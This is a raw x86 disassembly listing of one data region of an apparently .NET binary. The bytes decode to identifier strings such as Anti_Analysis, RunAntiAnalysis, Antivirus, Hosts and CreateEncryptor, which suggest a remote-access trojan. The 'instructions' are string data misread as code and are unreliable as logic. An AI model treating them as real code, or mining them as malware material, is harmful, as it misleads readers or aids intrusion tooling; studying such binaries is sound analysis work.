  408c6f:	54                   	push   %esp
  408c70:	6f                   	outsl  %ds:(%esi),(%dx)
  408c71:	55                   	push   %ebp
  408c72:	70 70                	jo     0x408ce4
  408c74:	65 72 00             	gs jb  0x408c77
  408c77:	44                   	inc    %esp
  408c78:	65 74 65             	gs je  0x408ce0
  408c7b:	63 74 4d 61          	arpl   %esi,0x61(%ebp,%ecx,2)
  408c7f:	6e                   	outsb  %ds:(%esi),(%dx)
  408c80:	75 66                	jne    0x408ce8
  408c82:	61                   	popa
  408c83:	63 74 75 72          	arpl   %esi,0x72(%ebp,%esi,2)
  408c87:	65 72 00             	gs jb  0x408c8a
  408c8a:	43                   	inc    %ebx
  408c8b:	75 72                	jne    0x408cff
  408c8d:	72 65                	jb     0x408cf4
  408c8f:	6e                   	outsb  %ds:(%esi),(%dx)
  408c90:	74 55                	je     0x408ce7
  408c92:	73 65                	jae    0x408cf9
  408c94:	72 00                	jb     0x408c96
  408c96:	53                   	push   %ebx
  408c97:	74 72                	je     0x408d0b
  408c99:	65 61                	gs popa
  408c9b:	6d                   	insl   (%dx),%es:(%edi)
  408c9c:	57                   	push   %edi
  408c9d:	72 69                	jb     0x408d08
  408c9f:	74 65                	je     0x408d06
  408ca1:	72 00                	jb     0x408ca3
  408ca3:	54                   	push   %esp
  408ca4:	65 78 74             	gs js  0x408d1b
  408ca7:	57                   	push   %edi
  408ca8:	72 69                	jb     0x408d13
  408caa:	74 65                	je     0x408d11
  408cac:	72 00                	jb     0x408cae
  408cae:	45                   	inc    %ebp
  408caf:	6e                   	outsb  %ds:(%esi),(%dx)
  408cb0:	74 65                	je     0x408d17
  408cb2:	72 00                	jb     0x408cb4
  408cb4:	42                   	inc    %edx
  408cb5:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  408cbc:	72 
  408cbd:	74 65                	je     0x408d24
  408cbf:	72 00                	jb     0x408cc1
  408cc1:	54                   	push   %esp
  408cc2:	6f                   	outsl  %ds:(%esi),(%dx)
  408cc3:	4c                   	dec    %esp
  408cc4:	6f                   	outsl  %ds:(%esi),(%dx)
  408cc5:	77 65                	ja     0x408d2c
  408cc7:	72 00                	jb     0x408cc9
  408cc9:	45                   	inc    %ebp
  408cca:	72 72                	jb     0x408d3e
  408ccc:	6f                   	outsl  %ds:(%esi),(%dx)
  408ccd:	72 00                	jb     0x408ccf
  408ccf:	49                   	dec    %ecx
  408cd0:	45                   	inc    %ebp
  408cd1:	6e                   	outsb  %ds:(%esi),(%dx)
  408cd2:	75 6d                	jne    0x408d41
  408cd4:	65 72 61             	gs jb  0x408d38
  408cd7:	74 6f                	je     0x408d48
  408cd9:	72 00                	jb     0x408cdb
  408cdb:	4d                   	dec    %ebp
  408cdc:	61                   	popa
  408cdd:	6e                   	outsb  %ds:(%esi),(%dx)
  408cde:	61                   	popa
  408cdf:	67 65 6d             	gs insl (%dx),%es:(%di)
  408ce2:	65 6e                	outsb  %gs:(%esi),(%dx)
  408ce4:	74 4f                	je     0x408d35
  408ce6:	62 6a 65             	bound  %ebp,0x65(%edx)
  408ce9:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  408ced:	75 6d                	jne    0x408d5c
  408cef:	65 72 61             	gs jb  0x408d53
  408cf2:	74 6f                	je     0x408d63
  408cf4:	72 00                	jb     0x408cf6
  408cf6:	53                   	push   %ebx
  408cf7:	79 73                	jns    0x408d6c
  408cf9:	74 65                	je     0x408d60
  408cfb:	6d                   	insl   (%dx),%es:(%edi)
  408cfc:	2e 43                	cs inc %ebx
  408cfe:	6f                   	outsl  %ds:(%esi),(%dx)
  408cff:	6c                   	insb   (%dx),%es:(%edi)
  408d00:	6c                   	insb   (%dx),%es:(%edi)
  408d01:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408d06:	6e                   	outsb  %ds:(%esi),(%dx)
  408d07:	73 2e                	jae    0x408d37
  408d09:	49                   	dec    %ecx
  408d0a:	45                   	inc    %ebp
  408d0b:	6e                   	outsb  %ds:(%esi),(%dx)
  408d0c:	75 6d                	jne    0x408d7b
  408d0e:	65 72 61             	gs jb  0x408d72
  408d11:	62 6c 65 2e          	bound  %ebp,0x2e(%ebp,%eiz,2)
  408d15:	47                   	inc    %edi
  408d16:	65 74 45             	gs je  0x408d5e
  408d19:	6e                   	outsb  %ds:(%esi),(%dx)
  408d1a:	75 6d                	jne    0x408d89
  408d1c:	65 72 61             	gs jb  0x408d80
  408d1f:	74 6f                	je     0x408d90
  408d21:	72 00                	jb     0x408d23
  408d23:	41                   	inc    %ecx
  408d24:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408d28:	61                   	popa
  408d29:	74 6f                	je     0x408d9a
  408d2b:	72 00                	jb     0x408d2d
  408d2d:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  408d32:	00 2e                	add    %ch,(%esi)
  408d34:	63 63 74             	arpl   %esp,0x74(%ebx)
  408d37:	6f                   	outsl  %ds:(%esi),(%dx)
  408d38:	72 00                	jb     0x408d3a
  408d3a:	4d                   	dec    %ebp
  408d3b:	6f                   	outsl  %ds:(%esi),(%dx)
  408d3c:	6e                   	outsb  %ds:(%esi),(%dx)
  408d3d:	69 74 6f 72 00 43 72 	imul   $0x65724300,0x72(%edi,%ebp,2),%esi
  408d44:	65 
  408d45:	61                   	popa
  408d46:	74 65                	je     0x408dad
  408d48:	44                   	inc    %esp
  408d49:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  408d4d:	70 74                	jo     0x408dc3
  408d4f:	6f                   	outsl  %ds:(%esi),(%dx)
  408d50:	72 00                	jb     0x408d52
  408d52:	43                   	inc    %ebx
  408d53:	72 65                	jb     0x408dba
  408d55:	61                   	popa
  408d56:	74 65                	je     0x408dbd
  408d58:	45                   	inc    %ebp
  408d59:	6e                   	outsb  %ds:(%esi),(%dx)
  408d5a:	63 72 79             	arpl   %esi,0x79(%edx)
  408d5d:	70 74                	jo     0x408dd3
  408d5f:	6f                   	outsl  %ds:(%esi),(%dx)
  408d60:	72 00                	jb     0x408d62
  408d62:	49                   	dec    %ecx
  408d63:	6e                   	outsb  %ds:(%esi),(%dx)
  408d64:	74 50                	je     0x408db6
  408d66:	74 72                	je     0x408dda
  408d68:	00 53 79             	add    %dl,0x79(%ebx)
  408d6b:	73 74                	jae    0x408de1
  408d6d:	65 6d                	gs insl (%dx),%es:(%edi)
  408d6f:	2e 44                	cs inc %esp
  408d71:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  408d78:	69 63 73 00 4e 61 74 	imul   $0x74614e00,0x73(%ebx),%esp
  408d7f:	69 76 65 4d 65 74 68 	imul   $0x6874654d,0x65(%esi),%esi
  408d86:	6f                   	outsl  %ds:(%esi),(%dx)
  408d87:	64 73 00             	fs jae 0x408d8a
  408d8a:	4d                   	dec    %ebp
  408d8b:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408d92:	74 2e                	je     0x408dc2
  408d94:	56                   	push   %esi
  408d95:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  408d9c:	73 69                	jae    0x408e07
  408d9e:	63 2e                	arpl   %ebp,(%esi)
  408da0:	44                   	inc    %esp
  408da1:	65 76 69             	gs jbe 0x408e0d
  408da4:	63 65 73             	arpl   %esp,0x73(%ebp)
  408da7:	00 53 79             	add    %dl,0x79(%ebx)
  408daa:	73 74                	jae    0x408e20
  408dac:	65 6d                	gs insl (%dx),%es:(%edi)
  408dae:	2e 52                	cs push %edx
  408db0:	75 6e                	jne    0x408e20
  408db2:	74 69                	je     0x408e1d
  408db4:	6d                   	insl   (%dx),%es:(%edi)
  408db5:	65 2e 49             	gs cs dec %ecx
  408db8:	6e                   	outsb  %ds:(%esi),(%dx)
  408db9:	74 65                	je     0x408e20
  408dbb:	72 6f                	jb     0x408e2c
  408dbd:	70 53                	jo     0x408e12
  408dbf:	65 72 76             	gs jb  0x408e38
  408dc2:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  408dc9:	73 74                	jae    0x408e3f
  408dcb:	65 6d                	gs insl (%dx),%es:(%edi)
  408dcd:	2e 52                	cs push %edx
  408dcf:	75 6e                	jne    0x408e3f
  408dd1:	74 69                	je     0x408e3c
  408dd3:	6d                   	insl   (%dx),%es:(%edi)
  408dd4:	65 2e 43             	gs cs inc %ebx
  408dd7:	6f                   	outsl  %ds:(%esi),(%dx)
  408dd8:	6d                   	insl   (%dx),%es:(%edi)
  408dd9:	70 69                	jo     0x408e44
  408ddb:	6c                   	insb   (%dx),%es:(%edi)
  408ddc:	65 72 53             	gs jb  0x408e32
  408ddf:	65 72 76             	gs jb  0x408e58
  408de2:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  408de9:	62 75 67             	bound  %esi,0x67(%ebp)
  408dec:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  408df3:	65 
  408df4:	73 00                	jae    0x408df6
  408df6:	45                   	inc    %ebp
  408df7:	78 70                	js     0x408e69
  408df9:	61                   	popa
  408dfa:	6e                   	outsb  %ds:(%esi),(%dx)
  408dfb:	64 45                	fs inc %ebp
  408dfd:	6e                   	outsb  %ds:(%esi),(%dx)
  408dfe:	76 69                	jbe    0x408e69
  408e00:	72 6f                	jb     0x408e71
  408e02:	6e                   	outsb  %ds:(%esi),(%dx)
  408e03:	6d                   	insl   (%dx),%es:(%edi)
  408e04:	65 6e                	outsb  %gs:(%esi),(%dx)
  408e06:	74 56                	je     0x408e5e
  408e08:	61                   	popa
  408e09:	72 69                	jb     0x408e74
  408e0b:	61                   	popa
  408e0c:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  408e10:	00 47 65             	add    %al,0x65(%edi)
  408e13:	74 50                	je     0x408e65
  408e15:	72 6f                	jb     0x408e86
  408e17:	63 65 73             	arpl   %esp,0x73(%ebp)
  408e1a:	73 65                	jae    0x408e81
  408e1c:	73 00                	jae    0x408e1e
  408e1e:	47                   	inc    %edi
  408e1f:	65 74 48             	gs je  0x408e6a
  408e22:	6f                   	outsl  %ds:(%esi),(%dx)
  408e23:	73 74                	jae    0x408e99
  408e25:	41                   	inc    %ecx
  408e26:	64 64 72 65          	fs fs jb 0x408e8f
  408e2a:	73 73                	jae    0x408e9f
  408e2c:	65 73 00             	gs jae 0x408e2f
  408e2f:	53                   	push   %ebx
  408e30:	79 73                	jns    0x408ea5
  408e32:	74 65                	je     0x408e99
  408e34:	6d                   	insl   (%dx),%es:(%edi)
  408e35:	2e 53                	cs push %ebx
  408e37:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408e3b:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  408e42:	70 
  408e43:	74 6f                	je     0x408eb4
  408e45:	67 72 61             	addr16 jb 0x408ea9
  408e48:	70 68                	jo     0x408eb2
  408e4a:	79 2e                	jns    0x408e7a
  408e4c:	58                   	pop    %eax
  408e4d:	35 30 39 43 65       	xor    $0x65433930,%eax
  408e52:	72 74                	jb     0x408ec8
  408e54:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408e5b:	73 00                	jae    0x408e5d
  408e5d:	45                   	inc    %ebp
  408e5e:	6e                   	outsb  %ds:(%esi),(%dx)
  408e5f:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408e62:	65 32 42 79          	xor    %gs:0x79(%edx),%al
  408e66:	74 65                	je     0x408ecd
  408e68:	73 00                	jae    0x408e6a
  408e6a:	47                   	inc    %edi
  408e6b:	65 74 55             	gs je  0x408ec3
  408e6e:	74 66                	je     0x408ed6
  408e70:	38 42 79             	cmp    %al,0x79(%edx)
  408e73:	74 65                	je     0x408eda
  408e75:	73 00                	jae    0x408e77
  408e77:	75 74                	jne    0x408eed
  408e79:	66 38 42 79          	data16 cmp %al,0x79(%edx)
  408e7d:	74 65                	je     0x408ee4
  408e7f:	73 00                	jae    0x408e81
  408e81:	52                   	push   %edx
  408e82:	66 63 32             	arpl   %si,(%edx)
  408e85:	38 39                	cmp    %bh,(%ecx)
  408e87:	38 44 65 72          	cmp    %al,0x72(%ebp,%eiz,2)
  408e8b:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%esi),%esi
  408e92:	73 00                	jae    0x408e94
  408e94:	52                   	push   %edx
  408e95:	65 61                	gs popa
  408e97:	64 41                	fs inc %ecx
  408e99:	6c                   	insb   (%dx),%es:(%edi)
  408e9a:	6c                   	insb   (%dx),%es:(%edi)
  408e9b:	42                   	inc    %edx
  408e9c:	79 74                	jns    0x408f12
  408e9e:	65 73 00             	gs jae 0x408ea1
  408ea1:	44                   	inc    %esp
  408ea2:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  408ea6:	65 46                	gs inc %esi
  408ea8:	72 6f                	jb     0x408f19
  408eaa:	6d                   	insl   (%dx),%es:(%edi)
  408eab:	42                   	inc    %edx
  408eac:	79 74                	jns    0x408f22
  408eae:	65 73 00             	gs jae 0x408eb1
  408eb1:	53                   	push   %ebx
  408eb2:	77 61                	ja     0x408f15
  408eb4:	70 42                	jo     0x408ef8
  408eb6:	79 74                	jns    0x408f2c
  408eb8:	65 73 00             	gs jae 0x408ebb
  408ebb:	4c                   	dec    %esp
  408ebc:	6f                   	outsl  %ds:(%esi),(%dx)
  408ebd:	61                   	popa
  408ebe:	64 46                	fs inc %esi
  408ec0:	69 6c 65 41 73 42 79 	imul   $0x74794273,0x41(%ebp,%eiz,2),%ebp
  408ec7:	74 
  408ec8:	65 73 00             	gs jae 0x408ecb
  408ecb:	47                   	inc    %edi
  408ecc:	65 74 41             	gs je  0x408f10
  408ecf:	73 42                	jae    0x408f13
  408ed1:	79 74                	jns    0x408f47
  408ed3:	65 73 00             	gs jae 0x408ed6
  408ed6:	53                   	push   %ebx
  408ed7:	65 74 41             	gs je  0x408f1b
  408eda:	73 42                	jae    0x408f1e
  408edc:	79 74                	jns    0x408f52
  408ede:	65 73 00             	gs jae 0x408ee1
  408ee1:	47                   	inc    %edi
  408ee2:	65 74 42             	gs je  0x408f27
  408ee5:	79 74                	jns    0x408f5b
  408ee7:	65 73 00             	gs jae 0x408eea
  408eea:	72 61                	jb     0x408f4d
  408eec:	77 42                	ja     0x408f30
  408eee:	79 74                	jns    0x408f64
  408ef0:	65 73 00             	gs jae 0x408ef3
  408ef3:	62 79 74             	bound  %edi,0x74(%ecx)
  408ef6:	65 73 00             	gs jae 0x408ef9
  408ef9:	43                   	inc    %ebx
  408efa:	53                   	push   %ebx
  408efb:	68 61 72 70 41       	push   $0x41707261
  408f00:	72 67                	jb     0x408f69
  408f02:	75 6d                	jne    0x408f71
  408f04:	65 6e                	outsb  %gs:(%esi),(%dx)
  408f06:	74 49                	je     0x408f51
  408f08:	6e                   	outsb  %ds:(%esi),(%dx)
  408f09:	66 6f                	outsw  %ds:(%esi),(%dx)
  408f0b:	46                   	inc    %esi
  408f0c:	6c                   	insb   (%dx),%es:(%edi)
  408f0d:	61                   	popa
  408f0e:	67 73 00             	addr16 jae 0x408f11
  408f11:	43                   	inc    %ebx
  408f12:	53                   	push   %ebx
  408f13:	68 61 72 70 42       	push   $0x42707261
  408f18:	69 6e 64 65 72 46 6c 	imul   $0x6c467265,0x64(%esi),%ebp
  408f1f:	61                   	popa
  408f20:	67 73 00             	addr16 jae 0x408f23
  408f23:	65 73 46             	gs jae 0x408f6c
  408f26:	6c                   	insb   (%dx),%es:(%edi)
  408f27:	61                   	popa
  408f28:	67 73 00             	addr16 jae 0x408f2b
  408f2b:	53                   	push   %ebx
  408f2c:	74 72                	je     0x408fa0
  408f2e:	69 6e 67 73 00 49 6e 	imul   $0x6e490073,0x67(%esi),%ebp
  408f35:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  408f3c:	65 
  408f3d:	53                   	push   %ebx
  408f3e:	65 74 74             	gs je  0x408fb5
  408f41:	69 6e 67 73 00 53 65 	imul   $0x65530073,0x67(%esi),%ebp
  408f48:	73 73                	jae    0x408fbd
  408f4a:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408f51:	6e                   	outsb  %ds:(%esi),(%dx)
  408f52:	67 45                	addr16 inc %ebp
  408f54:	76 65                	jbe    0x408fbb
  408f56:	6e                   	outsb  %ds:(%esi),(%dx)
  408f57:	74 41                	je     0x408f9a
  408f59:	72 67                	jb     0x408fc2
  408f5b:	73 00                	jae    0x408f5d
  408f5d:	41                   	inc    %ecx
  408f5e:	6e                   	outsb  %ds:(%esi),(%dx)
  408f5f:	74 69                	je     0x408fca
  408f61:	5f                   	pop    %edi
  408f62:	41                   	inc    %ecx
  408f63:	6e                   	outsb  %ds:(%esi),(%dx)
  408f64:	61                   	popa
  408f65:	6c                   	insb   (%dx),%es:(%edi)
  408f66:	79 73                	jns    0x408fdb
  408f68:	69 73 00 52 75 6e 41 	imul   $0x416e7552,0x0(%ebx),%esi
  408f6f:	6e                   	outsb  %ds:(%esi),(%dx)
  408f70:	74 69                	je     0x408fdb
  408f72:	41                   	inc    %ecx
  408f73:	6e                   	outsb  %ds:(%esi),(%dx)
  408f74:	61                   	popa
  408f75:	6c                   	insb   (%dx),%es:(%edi)
  408f76:	79 73                	jns    0x408feb
  408f78:	69 73 00 50 61 63 6b 	imul   $0x6b636150,0x0(%ebx),%esi
  408f7f:	73 00                	jae    0x408f81
  408f81:	49                   	dec    %ecx
  408f82:	43                   	inc    %ebx
  408f83:	72 65                	jb     0x408fea
  408f85:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408f88:	74 69                	je     0x408ff3
  408f8a:	61                   	popa
  408f8b:	6c                   	insb   (%dx),%es:(%edi)
  408f8c:	73 00                	jae    0x408f8e
  408f8e:	73 65                	jae    0x408ff5
  408f90:	74 5f                	je     0x408ff1
  408f92:	43                   	inc    %ebx
  408f93:	72 65                	jb     0x408ffa
  408f95:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408f98:	74 69                	je     0x409003
  408f9a:	61                   	popa
  408f9b:	6c                   	insb   (%dx),%es:(%edi)
  408f9c:	73 00                	jae    0x408f9e
  408f9e:	45                   	inc    %ebp
  408f9f:	71 75                	jno    0x409016
  408fa1:	61                   	popa
  408fa2:	6c                   	insb   (%dx),%es:(%edi)
  408fa3:	73 00                	jae    0x408fa5
  408fa5:	53                   	push   %ebx
  408fa6:	73 6c                	jae    0x409014
  408fa8:	50                   	push   %eax
  408fa9:	72 6f                	jb     0x40901a
  408fab:	74 6f                	je     0x40901c
  408fad:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  408fb0:	73 00                	jae    0x408fb2
  408fb2:	52                   	push   %edx
  408fb3:	65 61                	gs popa
  408fb5:	64 54                	fs push %esp
  408fb7:	6f                   	outsl  %ds:(%esi),(%dx)
  408fb8:	6f                   	outsl  %ds:(%esi),(%dx)
  408fb9:	6c                   	insb   (%dx),%es:(%edi)
  408fba:	73 00                	jae    0x408fbc
  408fbc:	57                   	push   %edi
  408fbd:	72 69                	jb     0x409028
  408fbf:	74 65                	je     0x409026
  408fc1:	54                   	push   %esp
  408fc2:	6f                   	outsl  %ds:(%esi),(%dx)
  408fc3:	6f                   	outsl  %ds:(%esi),(%dx)
  408fc4:	6c                   	insb   (%dx),%es:(%edi)
  408fc5:	73 00                	jae    0x408fc7
  408fc7:	42                   	inc    %edx
  408fc8:	79 74                	jns    0x40903e
  408fca:	65 73 54             	gs jae 0x409021
  408fcd:	6f                   	outsl  %ds:(%esi),(%dx)
  408fce:	6f                   	outsl  %ds:(%esi),(%dx)
  408fcf:	6c                   	insb   (%dx),%es:(%edi)
  408fd0:	73 00                	jae    0x408fd2
  408fd2:	53                   	push   %ebx
  408fd3:	79 73                	jns    0x409048
  408fd5:	74 65                	je     0x40903c
  408fd7:	6d                   	insl   (%dx),%es:(%edi)
  408fd8:	2e 57                	cs push %edi
  408fda:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  408fe1:	46                   	inc    %esi
  408fe2:	6f                   	outsl  %ds:(%esi),(%dx)
  408fe3:	72 6d                	jb     0x409052
  408fe5:	73 00                	jae    0x408fe7
  408fe7:	44                   	inc    %esp
  408fe8:	6e                   	outsb  %ds:(%esi),(%dx)
  408fe9:	73 00                	jae    0x408feb
  408feb:	43                   	inc    %ebx
  408fec:	6f                   	outsl  %ds:(%esi),(%dx)
  408fed:	6e                   	outsb  %ds:(%esi),(%dx)
  408fee:	74 61                	je     0x409051
  408ff0:	69 6e 73 00 53 79 73 	imul   $0x73795300,0x73(%esi),%ebp
  408ff7:	74 65                	je     0x40905e
  408ff9:	6d                   	insl   (%dx),%es:(%edi)
  408ffa:	2e 43                	cs inc %ebx
  408ffc:	6f                   	outsl  %ds:(%esi),(%dx)
  408ffd:	6c                   	insb   (%dx),%es:(%edi)
  408ffe:	6c                   	insb   (%dx),%es:(%edi)
  408fff:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409004:	6e                   	outsb  %ds:(%esi),(%dx)
  409005:	73 00                	jae    0x409007
  409007:	53                   	push   %ebx
  409008:	74 72                	je     0x40907c
  40900a:	69 6e 67 53 70 6c 69 	imul   $0x696c7053,0x67(%esi),%ebp
  409011:	74 4f                	je     0x409062
  409013:	70 74                	jo     0x409089
  409015:	69 6f 6e 73 00 47 65 	imul   $0x65470073,0x6e(%edi),%ebp
  40901c:	74 49                	je     0x409067
  40901e:	6d                   	insl   (%dx),%es:(%edi)
  40901f:	61                   	popa
  409020:	67 65 44             	addr16 gs inc %esp
  409023:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  409027:	65 72 73             	gs jb  0x40909d
  40902a:	00 52 75             	add    %dl,0x75(%edx)
  40902d:	6e                   	outsb  %ds:(%esi),(%dx)
  40902e:	74 69                	je     0x409099
  409030:	6d                   	insl   (%dx),%es:(%edi)
  409031:	65 48                	gs dec %eax
  409033:	65 6c                	gs insb (%dx),%es:(%edi)
  409035:	70 65                	jo     0x40909c
  409037:	72 73                	jb     0x4090ac
  409039:	00 53 73             	add    %dl,0x73(%ebx)
  40903c:	6c                   	insb   (%dx),%es:(%edi)
  40903d:	50                   	push   %eax
  40903e:	6f                   	outsl  %ds:(%esi),(%dx)
  40903f:	6c                   	insb   (%dx),%es:(%edi)
  409040:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  409047:	72 73                	jb     0x4090bc
  409049:	00 73 73             	add    %dh,0x73(%ebx)
  40904c:	6c                   	insb   (%dx),%es:(%edi)
  40904d:	50                   	push   %eax
  40904e:	6f                   	outsl  %ds:(%esi),(%dx)
  40904f:	6c                   	insb   (%dx),%es:(%edi)
  409050:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  409057:	72 73                	jb     0x4090cc
  409059:	00 46 69             	add    %al,0x69(%esi)
  40905c:	6c                   	insb   (%dx),%es:(%edi)
  40905d:	65 41                	gs inc %ecx
  40905f:	63 63 65             	arpl   %esp,0x65(%ebx)
  409062:	73 73                	jae    0x4090d7
  409064:	00 68 50             	add    %ch,0x50(%eax)
  409067:	72 6f                	jb     0x4090d8
  409069:	63 65 73             	arpl   %esp,0x73(%ebp)
  40906c:	73 00                	jae    0x40906e
  40906e:	47                   	inc    %edi
  40906f:	65 74 43             	gs je  0x4090b5
  409072:	75 72                	jne    0x4090e6
  409074:	72 65                	jb     0x4090db
  409076:	6e                   	outsb  %ds:(%esi),(%dx)
  409077:	74 50                	je     0x4090c9
  409079:	72 6f                	jb     0x4090ea
  40907b:	63 65 73             	arpl   %esp,0x73(%ebp)
  40907e:	73 00                	jae    0x409080
  409080:	49                   	dec    %ecx
  409081:	50                   	push   %eax
  409082:	41                   	inc    %ecx
  409083:	64 64 72 65          	fs fs jb 0x4090ec
  409087:	73 73                	jae    0x4090fc
  409089:	00 43 6f             	add    %al,0x6f(%ebx)
  40908c:	6d                   	insl   (%dx),%es:(%edi)
  40908d:	70 72                	jo     0x409101
  40908f:	65 73 73             	gs jae 0x409105
  409092:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  409096:	6f                   	outsl  %ds:(%esi),(%dx)
  409097:	6d                   	insl   (%dx),%es:(%edi)
  409098:	70 72                	jo     0x40910c
  40909a:	65 73 73             	gs jae 0x409110
  40909d:	00 53 79             	add    %dl,0x79(%ebx)
  4090a0:	73 74                	jae    0x409116
  4090a2:	65 6d                	gs insl (%dx),%es:(%edi)
  4090a4:	2e 4e                	cs dec %esi
  4090a6:	65 74 2e             	gs je  0x4090d7
  4090a9:	53                   	push   %ebx
  4090aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4090ab:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4090ae:	74 73                	je     0x409123
  4090b0:	00 73 65             	add    %dh,0x65(%ebx)
  4090b3:	74 5f                	je     0x409114
  4090b5:	41                   	inc    %ecx
  4090b6:	72 67                	jb     0x40911f
  4090b8:	75 6d                	jne    0x409127
  4090ba:	65 6e                	outsb  %gs:(%esi),(%dx)
  4090bc:	74 73                	je     0x409131
  4090be:	00 53 79             	add    %dl,0x79(%ebx)
  4090c1:	73 74                	jae    0x409137
  4090c3:	65 6d                	gs insl (%dx),%es:(%edi)
  4090c5:	45                   	inc    %ebp
  4090c6:	76 65                	jbe    0x40912d
  4090c8:	6e                   	outsb  %ds:(%esi),(%dx)
  4090c9:	74 73                	je     0x40913e
  4090cb:	00 50 6f             	add    %dl,0x6f(%eax)
  4090ce:	72 74                	jb     0x409144
  4090d0:	73 00                	jae    0x4090d2
  4090d2:	45                   	inc    %ebp
  4090d3:	78 69                	js     0x40913e
  4090d5:	73 74                	jae    0x40914b
  4090d7:	73 00                	jae    0x4090d9
  4090d9:	48                   	dec    %eax
  4090da:	6f                   	outsl  %ds:(%esi),(%dx)
  4090db:	73 74                	jae    0x409151
  4090dd:	73 00                	jae    0x4090df
  4090df:	41                   	inc    %ecx
  4090e0:	6e                   	outsb  %ds:(%esi),(%dx)
  4090e1:	74 69                	je     0x40914c
  4090e3:	76 69                	jbe    0x40914e
  4090e5:	72 75                	jb     0x40915c
  4090e7:	73 00                	jae    0x4090e9
  4090e9:	43                   	inc    %ebx
  4090ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4090eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4090ec:	63 61 74             	arpl   %esp,0x74(%ecx)
  4090ef:	00 49 6d             	add    %cl,0x6d(%ecx)
  4090f2:	61                   	popa
  4090f3:	67 65 46             	addr16 gs inc %esi
  4090f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4090f7:	72 6d                	jb     0x409166
  4090f9:	61                   	popa
  4090fa:	74 00                	je     0x4090fc
  4090fc:	66 6f                	outsw  %ds:(%esi),(%dx)
  4090fe:	72 6d                	jb     0x40916d
  409100:	61                   	popa
  409101:	74 00                	je     0x409103
  409103:	57                   	push   %edi
  409104:	72 69                	jb     0x40916f
  409106:	74 65                	je     0x40916d
  409108:	46                   	inc    %esi
  409109:	6c                   	insb   (%dx),%es:(%edi)
  40910a:	6f                   	outsl  %ds:(%esi),(%dx)
  40910b:	61                   	popa
  40910c:	74 00                	je     0x40910e
  40910e:	67 65 74 5f          	addr16 gs je 0x409171
  409112:	41                   	inc    %ecx
  409113:	73 46                	jae    0x40915b
  409115:	6c                   	insb   (%dx),%es:(%edi)
  409116:	6f                   	outsl  %ds:(%esi),(%dx)
  409117:	61                   	popa
  409118:	74 00                	je     0x40911a
  40911a:	73 65                	jae    0x409181
  40911c:	74 5f                	je     0x40917d
  40911e:	41                   	inc    %ecx
  40911f:	73 46                	jae    0x409167
  409121:	6c                   	insb   (%dx),%es:(%edi)
  409122:	6f                   	outsl  %ds:(%esi),(%dx)
  409123:	61                   	popa
  409124:	74 00                	je     0x409126
  409126:	47                   	inc    %edi
  409127:	65 74 41             	gs je  0x40916b
  40912a:	73 46                	jae    0x409172
  40912c:	6c                   	insb   (%dx),%es:(%edi)
  40912d:	6f                   	outsl  %ds:(%esi),(%dx)
  40912e:	61                   	popa
  40912f:	74 00                	je     0x409131
  409131:	53                   	push   %ebx
  409132:	65 74 41             	gs je  0x409176
  409135:	73 46                	jae    0x40917d
  409137:	6c                   	insb   (%dx),%es:(%edi)
  409138:	6f                   	outsl  %ds:(%esi),(%dx)
  409139:	61                   	popa
  40913a:	74 00                	je     0x40913c
  40913c:	46                   	inc    %esi
  40913d:	69 6e 64 4f 62 6a 65 	imul   $0x656a624f,0x64(%esi),%ebp
  409144:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  409148:	61                   	popa
  409149:	6e                   	outsb  %ds:(%esi),(%dx)
  40914a:	61                   	popa
  40914b:	67 65 6d             	gs insl (%dx),%es:(%di)
  40914e:	65 6e                	outsb  %gs:(%esi),(%dx)
  409150:	74 42                	je     0x409194
  409152:	61                   	popa
  409153:	73 65                	jae    0x4091ba
  409155:	4f                   	dec    %edi
  409156:	62 6a 65             	bound  %ebp,0x65(%edx)
  409159:	63 74 00 46          	arpl   %esi,0x46(%eax,%eax,1)
  40915d:	6f                   	outsl  %ds:(%esi),(%dx)
  40915e:	72 63                	jb     0x4091c3
  409160:	65 50                	gs push %eax
  409162:	61                   	popa
  409163:	74 68                	je     0x4091cd
  409165:	4f                   	dec    %edi
  409166:	62 6a 65             	bound  %ebp,0x65(%edx)
  409169:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
